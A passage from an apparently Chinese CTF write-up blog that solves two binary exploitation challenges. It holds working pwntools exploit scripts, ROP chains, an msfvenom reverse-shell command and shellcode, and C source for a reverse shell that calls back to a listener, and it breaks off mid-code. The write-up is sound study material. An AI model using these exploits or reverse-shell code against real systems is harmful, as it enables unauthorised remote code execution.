<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ( v7 &gt; <span class="number">0x400</span>u )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;v8[v7], &amp;v8[v6], v5);</span><br><span class="line">  v7 += v5;			<span class="comment">// 没有对 v7+v5 做一个检查</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先是利用write泄露地址，注意过程中不要破坏栈帧。由于fork前后进程的基址和canary不变，第二次进行orw或者是反弹shell。关于调试，第一次的时候直接跟踪子进程就好，第二次则需要先跟踪父进程跳过第一次泄露的过程，再跟踪子进程。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment"># sh = remote(&#x27;182.92.23.153&#x27;, 13051)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./secretnote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">2</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">3</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">4</span>) + <span class="string">b&#x27;\x40&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0x400</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xef&#x27;</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.recv(<span class="number">8</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">8</span>)) - <span class="number">0x11a28</span></span><br><span class="line">success(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">sh.recv(<span class="number">0x408</span> - <span class="number">0x10</span>)</span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">leak_stack = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line">success(<span class="string">&#x27;leak_stack: &#x27;</span> + <span class="built_in">hex</span>(leak_stack))</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">p_rdx_r = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh.close()</span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"><span class="comment"># sh = remote(&#x27;182.92.23.153&#x27;, 13051)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">vul = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(canary) + p64(<span class="number">0</span>)</span><br><span class="line">vul += p64(p_rdi_r) + p64(leak_stack - <span class="number">0x110</span>)</span><br><span class="line">vul += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">vul += p64(p_rdx_r) + p64(<span class="number">0</span>)</span><br><span class="line">vul += p64(<span class="built_in">open</span>)</span><br><span class="line">vul += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">vul += p64(p_rsi_r) + p64(leak_stack - <span class="number">0x200</span>)</span><br><span class="line">vul += p64(p_rdx_r) + p64(<span class="number">0x50</span>)</span><br><span class="line">vul += p64(read)</span><br><span class="line">vul += p64(p_rdi_r) + p64(<span class="number">4</span>)</span><br><span class="line">vul += p64(p_rsi_r) + p64(leak_stack - <span class="number">0x200</span>)</span><br><span class="line">vul += p64(p_rdx_r) + p64(<span class="number">0x50</span>)</span><br><span class="line">vul += p64(write)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;\xab&#x27;</span> + <span class="string">b&#x27;\xf0&#x27;</span> + vul.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">2</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">3</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0xf0</span> * <span class="number">4</span>) + <span class="string">b&#x27;\x40&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xcd&#x27;</span> + p16(<span class="number">0</span>) + <span class="string">b&#x27;\xf0&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;\xef&#x27;</span></span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><h3 id="rooter"><a href="#rooter" class="headerlink" title="rooter"></a>rooter</h3><p>和初赛的题目差不多，不过决赛的时候没想到用msf生成的shellcode去反弹shell，属实有点可惜了。</p>
<p>首先是程序逻辑的分析，开始时调用了<code>init_dispatcher()</code>将请求页面与相应的函数进行了注册：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">init_dispatcher</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( open(<span class="string">&quot;/dev/zero&quot;</span>, <span class="number">2</span>, <span class="number">0LL</span>) == <span class="number">-1</span> )</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line">  global_block = (<span class="type">char</span> *)mmap((<span class="type">void</span> *)<span class="number">0x233C000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;rpm_list, <span class="number">0</span>, <span class="number">0x18</span>uLL);</span><br><span class="line">  rpm_conf_add((__int64)&amp;rpm_list, <span class="string">&quot;Login.html&quot;</span>, (<span class="type">char</span> *)login_rpm);</span><br><span class="line">  rpm_conf_add((__int64)&amp;rpm_list, <span class="string">&quot;UpnpCfg.html&quot;</span>, (<span class="type">char</span> *)UpnpCfg_rpm);</span><br><span class="line">  rpm_conf_add((__int64)&amp;rpm_list, <span class="string">&quot;WanStaticIp.html&quot;</span>, (<span class="type">char</span> *)WanStaticIp_rpm);</span><br><span class="line">  <span class="keyword">return</span> rpm_conf_add((__int64)&amp;rpm_list, <span class="string">&quot;AccessCtrlAccess.html&quot;</span>, (<span class="type">char</span> *)AccessCtrlAccess_rpm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后开启socket通信监听8008端口，同时循环创建进程处理我们的数据，在<code>server_create</code>中的<code>req_trans</code>函数我们可以找到是POST请求的方式，同时会调用<code>set_env</code>进行请求体键值对的保存：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">req_trans</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">regex_t</span> preg; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">regmatch_t</span> v3; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+58h] [rbp-28h]</span></span><br><span class="line">  __int64 path_len; <span class="comment">// [rsp+60h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+68h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+70h] [rbp-10h]</span></span><br><span class="line">  <span class="type">ssize_t</span> v8; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = recv(*(_DWORD *)(a1 + <span class="number">16</span>), *(<span class="type">void</span> **)(a1 + <span class="number">24</span>), <span class="number">0x6400000</span>uLL, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(*(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">24</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v8 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    regcomp(&amp;preg, <span class="string">&quot;^POST /([^ ]*) HTTP/1&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !regexec(&amp;preg, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">24</span>), <span class="number">2uLL</span>, &amp;v3, <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *(_QWORD *)(a1 + <span class="number">24</span>) + v4;</span><br><span class="line">      v6 = url_decode(v7);</span><br><span class="line">      path_len = (<span class="type">int</span>)get_path_len(v6);</span><br><span class="line">      set_path(a1, v6, path_len);</span><br><span class="line">      req_analy_env(a1, v6);				<span class="comment">// 存储键值对</span></span><br><span class="line">    &#125;</span><br><span class="line">    regfree(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后会进入<code>rep_dispatcher</code>函数，请求与url相对应的函数，也就是之前注册的函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">rep_dispatcher</span><span class="params">(<span class="type">const</span> <span class="type">char</span> **a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v4)(<span class="type">const</span> <span class="type">char</span> **); <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0LL</span>;</span><br><span class="line">  v3 = rpm_list;			<span class="comment">// 注册的函数表</span></span><br><span class="line">  <span class="keyword">if</span> ( dword_404BF0 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strlen</span>(*(<span class="type">const</span> <span class="type">char</span> **)v3);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*a1, *(<span class="type">const</span> <span class="type">char</span> **)v3, v2) )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *(<span class="type">void</span> (__fastcall **)(<span class="type">const</span> <span class="type">char</span> **))(v3 + <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v3 = *(_QWORD *)(v3 + <span class="number">16</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    v4(a1);			<span class="comment">// 执行相应的函数</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    login_rpm(a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一共有四种请求的页面，漏洞出现在<code>WanStaticIp.html</code>请求中，发现调用了<code>strcpy</code>函数进行拷贝导致了栈溢出，同时<code>global_block</code>是利用mmap分配的一块具有执行权限的固定地址的区域，可以执行我们的shellcode：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">WanStaticIp_rpm</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">256</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+110h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+218h] [rbp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+220h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// [rsp+228h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *env; <span class="comment">// [rsp+230h] [rbp-10h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">  src = (<span class="type">char</span> *)get_env(a1, <span class="string">&quot;ipaddr&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( global_block )</span><br><span class="line">    <span class="built_in">strcpy</span>(global_block, src);</span><br><span class="line">  env = (<span class="type">char</span> *)get_env(a1, <span class="string">&quot;dnsserver1&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( env )</span><br><span class="line">    <span class="built_in">strcpy</span>(s, env);			<span class="comment">// 产生栈溢出</span></span><br><span class="line">  v5 = (<span class="type">char</span> *)get_env(a1, <span class="string">&quot;dnsserver2&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, v5);		<span class="comment">// 产生栈溢出</span></span><br><span class="line">  set_run_time_dns_ip(s, dest);</span><br><span class="line">  v4 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0xC800000</span>uLL);</span><br><span class="line">  <span class="built_in">snprintf</span>(v4, <span class="number">0x6400000</span>uLL, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: %s\r\n\r\n&quot;</span>, <span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">  n = <span class="built_in">strlen</span>(v4);</span><br><span class="line">  send(*(_DWORD *)(a1 + <span class="number">16</span>), v4, n, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">free</span>(v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本来尝试利用execve反弹shell，调试下来也是执行到了，但是执行失败，不知道为什么？</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230904181152662.png" alt="image-20230904181152662"></p>
<p>看了WP发现是写了msf的shellcode，调试了一下，发现是开启了socket然后传了&#x2F;bin&#x2F;sh过来，成功了。由于处理请求体的时候会对字符<code>=</code>和<code>&amp;</code>做一个截断，同时程序也会对<code>\x00</code>做截断，所以shellcode不能包含上述字符。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp -b &#x27;\x00\x26\x3d&#x27; LHOST=192.168.215.134 LPORT=5555 -f py -o shellcode.py</span><br></pre></td></tr></table></figure>

<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> _thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">ip, port</span>):</span><br><span class="line">    context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    vul_addr = <span class="number">0x233c010</span></span><br><span class="line">    vul = cyclic(<span class="number">0x238</span>)</span><br><span class="line">    vul += flat(vul_addr)</span><br><span class="line"></span><br><span class="line">    buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x05\xef\xff\xff\xff\x48\xbb\x05\x0e\xe2\xc4\x76&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\xf9\xbc\xc4\x48\x31\x58\x27\x48\x2d\xf8\xff\xff&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\xff\xe2\xf4\x6f\x27\xba\x5d\x1c\xfb\xe3\xae\x04&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x50\xed\xc1\x3e\x6e\xf4\x7d\x07\x0e\xf7\x77\xb6&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x51\x6b\x42\x54\x46\x6b\x22\x1c\xe9\xe6\xae\x2f&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x56\xed\xc1\x1c\xfa\xe2\x8c\xfa\xc0\x88\xe5\x2e&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\xf6\xb9\xb1\xf3\x64\xd9\x9c\xef\xb1\x07\xeb\x67&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\x67\x8c\xeb\x05\x91\xbc\x97\x4d\x87\x05\x96\x21&quot;</span></span><br><span class="line">    buf += <span class="string">b&quot;\xb1\x35\x22\x0a\x0b\xe2\xc4\x76\xf9\xbc\xc4&quot;</span></span><br><span class="line"></span><br><span class="line">    shellcode = cyclic(<span class="number">0x10</span>)</span><br><span class="line">    shellcode += buf</span><br><span class="line"></span><br><span class="line">    pld = <span class="string">b&#x27;POST /WanStaticIp.html HTTP/1\r\n\r\n&#x27;</span></span><br><span class="line">    pld += <span class="string">b&#x27;ipaddr=&#x27;</span> + shellcode + <span class="string">b&#x27;&amp;dnsserver1=11&#x27;</span> + <span class="string">b&#x27;&amp;dnsserver2=&#x27;</span> + vul</span><br><span class="line"></span><br><span class="line">    sh.send(pld)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_shell_flag</span>():</span><br><span class="line">    li = listen(<span class="number">5555</span>).wait_for_connection()</span><br><span class="line">    li.sendline(<span class="string">&#x27;cat /flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;+ab&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(li.recv())</span><br><span class="line">    li.interactive()</span><br><span class="line"></span><br><span class="line">_thread.start_new_thread(get_shell_flag, ())</span><br><span class="line">pwn(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8008</span>)</span><br></pre></td></tr></table></figure>

<p>也可以利用orw的方法，但是比赛时候忘记换libc了，比赛的时候是将<code>/flag</code>字符串写在了shellcode末尾，而不是用shellcode去构造，在2.35的版本下没有问题，但是换成2.23会在字符串末尾加一些奇怪的字符导致open失败。我真的悔死呜呜呜。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8008</span>)</span><br><span class="line"></span><br><span class="line">vul_addr = <span class="number">0x233c010</span></span><br><span class="line">vul = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x238</span></span><br><span class="line">vul += p64(vul_addr)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">shellcode += asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rax, 0x101010101010101 ^ 0x67616c662f;</span></span><br><span class="line"><span class="string">xor [rsp], rax;</span></span><br><span class="line"><span class="string">mov rdi, rsp;</span></span><br><span class="line"><span class="string">xor edx, edx;</span></span><br><span class="line"><span class="string">xor esi, esi;</span></span><br><span class="line"><span class="string">push SYS_open;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7;</span></span><br><span class="line"><span class="string">push 0x233c0f0;</span></span><br><span class="line"><span class="string">push 0x30;</span></span><br><span class="line"><span class="string">pop rdx;</span></span><br><span class="line"><span class="string">pop rsi;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">xor rax, rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x5;</span></span><br><span class="line"><span class="string">push 0x1;</span></span><br><span class="line"><span class="string">pop rax;</span></span><br><span class="line"><span class="string">pop rdi;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;POST /WanStaticIp.html HTTP/1\r\n\r\n&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;ipaddr=&#x27;</span> + shellcode + <span class="string">b&#x27;&amp;dnsserver1=11&#x27;</span> + <span class="string">b&#x27;&amp;dnsserver2=&#x27;</span> + vul</span><br><span class="line">sh.send(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>关于patch的问题，这里有两种修复方法，一种是缩减一些冗余的汇编，如下图：</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230906172856817.png" alt="image-20230906172856817"></p>
<p>还有一种方法是修改<code>.eh_frame</code>为可执行做一个跳转，直接在IDA就可以修改权限。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230906173743196.png" alt="image-20230906173743196"></p>
<p>最后学习一下如何写shellcode来反弹shell，首先用C函数来实现：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> clientSocket = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to create socket&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">remoteAddress</span>;</span></span><br><span class="line">    remoteAddress.sin_family = AF_INET;</span><br><span class="line">    remoteAddress.sin_addr.s_addr = inet_addr(<span class="string">&quot;192.168.215.134&quot;</span>);</span><br><span class="line">    remoteAddress.sin_port = htons(<span class="number">5555</span>);</span><br><span class="line">    <span class="keyword">if</span> (connect(clientSocket, (<span class="keyword">struct</span> sockaddr *)&amp;remoteAddress, <span class="keyword">sizeof</span>(remoteAddress)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Failed to connect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);        </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Connect successfully\n&quot;</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;inet_addr: %d\n&quot;</span>, remoteAddress.sin_addr.s_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dup2(clientSocket, <span class="number">2</span>);</span><br><span class="line">    dup2(clientSocket, <span class="number">1</span>);</span><br><span class="line">    dup2(clientSocket, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是利用shellcode来实现，主要要解决的问题是如何构造sockaddr_in结构体，先来看定义：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __SOCKADDR_COMMON (sin_);</span><br><span class="line">    <span class="type">in_port_t</span> sin_port;			<span class="comment">/* Port number.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>		<span class="comment">/* Internet address.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pad to size of `struct sockaddr&#x27;.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> sin_zero[<span class="keyword">sizeof</span> (<span class="keyword">struct</span> sockaddr)</span><br><span class="line">			   - __SOCKADDR_COMMON_SIZE</span><br><span class="line">			   - <span class="keyword">sizeof</span> (<span class="type">in_port_t</span>)</span><br><span class="line">			   - <span class="keyword">sizeof</span> (<span class="keyword">struct</span> in_addr)];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sin_family</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> <span class="type">sa_family_t</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	__SOCKADDR_COMMON(sa_prefix) \</span></span><br><span class="line"><span class="meta">  sa_family_t sa_prefix##family</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// sin_port</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint16_t</span> <span class="type">in_port_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sin_addr.s_addr</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">uint32_t</span> <span class="type">in_addr_t</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="type">in_addr_t</span> s_addr;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>然后来看这个结构体在内存中的表现，写了一个demo：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">remoteAddress</span>;</span></span><br><span class="line">    remoteAddress.sin_family = AF_INET;</span><br><span class="line">    remoteAddress.sin_addr.s_addr = inet_addr(<span class="string">&quot;192.168.215.134&quot;</span>);</span><br><span class="line">    remoteAddress.sin_port = htons(<span class="number">5555</span>);</span><br><span class="line"></span><br><span class="line">    <span 